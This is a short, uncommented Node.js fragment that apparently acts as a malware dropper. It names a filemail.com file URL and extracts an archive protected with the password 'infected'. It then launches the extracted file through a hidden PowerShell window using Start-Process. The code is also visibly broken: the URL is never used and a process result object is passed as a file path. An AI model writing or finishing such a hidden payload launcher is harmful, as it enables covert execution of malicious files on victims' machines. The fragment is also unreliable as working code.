const {spawnSync}=require('child_process');
const r='https://3005.filemail.com/api/file/get?filekey=fixture';
function e(a,t) { return spawnSync(t,['x','-pinfected','-y',a,`-o${t}`]); }
function run(x,z) { const b=e(x.p,z); spawnSync('powershell',['-NoProfile','-WindowStyle','Hidden','-Command',`Start-Process "${b}"`]); }
